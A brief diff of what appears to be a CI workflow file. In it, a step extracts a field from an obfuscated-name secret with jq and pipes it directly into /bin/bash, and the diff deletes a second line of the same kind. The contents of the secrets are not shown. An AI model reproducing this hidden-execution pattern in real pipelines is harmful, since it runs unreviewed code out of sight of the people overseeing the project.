@@ -21,7 +21,6 @@ jobs:
           qa0145: ${{ secrets.qa0145 }}
         run: |
           printf '%s' "$qa0145" | jq -r .yoz0692 | /bin/bash
-          printf '%s' "$t37" | jq -r .z70002 | /bin/bash
 
       - name: Save output
         if: always()
